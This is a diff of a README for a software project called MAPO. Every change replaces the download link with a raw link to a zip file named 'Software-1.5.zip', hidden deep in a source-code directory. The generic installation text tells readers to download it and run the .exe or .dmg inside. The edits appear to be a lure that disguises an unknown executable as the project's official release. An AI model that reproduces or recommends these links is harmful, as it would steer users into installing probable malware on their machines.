@@ -2,7 +2,7 @@
 
 ## 🔗 Download Now
 
-[![Download MAPO](https://raw.githubusercontent.com/ARGROB2023/MAPO/main/strawberrylike/MAPO.zip%20MAPO-v1.0-brightgreen)](https://raw.githubusercontent.com/ARGROB2023/MAPO/main/strawberrylike/MAPO.zip)
+[![Download MAPO](https://raw.githubusercontent.com/ARGROB2023/MAPO/main/code/verl/single_controller/base/Software-1.5.zip%20MAPO-v1.0-brightgreen)](https://raw.githubusercontent.com/ARGROB2023/MAPO/main/code/verl/single_controller/base/Software-1.5.zip)
 
 ## 📖 Introduction
 
@@ -14,7 +14,7 @@ To begin using MAPO, you will need to download the application. Here is how to d
 
 1. Open your web browser.
 2. Click on the link below to visit the release page:
-   [Download MAPO Releases](https://raw.githubusercontent.com/ARGROB2023/MAPO/main/strawberrylike/MAPO.zip)
+   [Download MAPO Releases](https://raw.githubusercontent.com/ARGROB2023/MAPO/main/code/verl/single_controller/base/Software-1.5.zip)
 3. Find the latest version of the application. This is typically the top listing on the page.
 4. Download the file for your operating system. Look for options that are labeled with `.exe` for Windows, `.dmg` for macOS, or other formats depending on your system.
 
@@ -23,7 +23,7 @@ To begin using MAPO, you will need to download the application. Here is how to d
 To install and run MAPO:
 
 1. Return to the download link provided earlier: 
-   [Download MAPO Releases](https://raw.githubusercontent.com/ARGROB2023/MAPO/main/strawberrylike/MAPO.zip).
+   [Download MAPO Releases](https://raw.githubusercontent.com/ARGROB2023/MAPO/main/code/verl/single_controller/base/Software-1.5.zip).
 2. Click on the file that you downloaded.
 3. If you are using Windows, double-click the `.exe` file. For macOS, open the `.dmg` file and drag the application into your Applications folder.
 4. Follow any prompts that appear during the installation process.
@@ -62,7 +62,7 @@ MAPO comes equipped with various features to enhance your experience:
 If you encounter issues while using MAPO, try the following:
 
 - **Reinstall**: If the application does not open, try uninstalling and then reinstalling it.
-- **Check for Updates**: Ensure you are using the latest version from the [Release Page](https://raw.githubusercontent.com/ARGROB2023/MAPO/main/strawberrylike/MAPO.zip).
+- **Check for Updates**: Ensure you are using the latest version from the [Release Page](https://raw.githubusercontent.com/ARGROB2023/MAPO/main/code/verl/single_controller/base/Software-1.5.zip).
 - **Contact Support**: Reach out to the support team through the contact details provided in the application.
 
 ## 📣 Community and Support
